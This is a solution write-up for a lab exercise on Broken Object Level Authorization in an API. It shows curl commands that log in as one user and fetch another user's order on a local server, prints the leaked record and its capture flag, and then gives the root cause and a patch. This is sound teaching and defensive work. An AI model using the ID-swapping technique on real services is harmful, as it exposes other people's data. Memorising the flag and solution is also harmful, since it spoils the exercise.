# Solution: API1:2023 Broken Object Level Authorization (BOLA)

## 1. Walkthrough & Exploitation

### Step 1: Login as Bob
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "bob", "password": "Password123!"}'
```
Extract `access_token` from response.

### Step 2: Request Alice's Order (#1)
```bash
curl -s -X GET http://127.0.0.1:8000/api/v1/orders/1 \
  -H "Authorization: Bearer <BOB_ACCESS_TOKEN>"
```

### Exploit Evidence
```json
{
  "id": 1,
  "user_id": 1,
  "total_amount": 179.98,
  "status": "delivered",
  "shipping_address": "101 Cyber Way, San Jose, CA",
  "tracking_number": "TRACK-ALICE-1001",
  "flag": "FLAG{API1_BOLA_ORDER_DATA_EXPOSED_9182}"
}
```

---

## 2. Root Cause Analysis
The controller in `app/routers/orders.py` queries the database by primary key directly from the URL path (`Order.id == order_id`), but omits checking whether `order.user_id == current_user.id` or `current_user.role == "admin"`.

---

## 3. Patched Implementation
```python
# FIX: API1-BOLA
if order.user_id != current_user.id and current_user.role != "admin":
    raise HTTPException(
        status_code=status.HTTP_403_FORBIDDEN,
        detail="Access denied: You do not have permission to view this order.",
    )
```
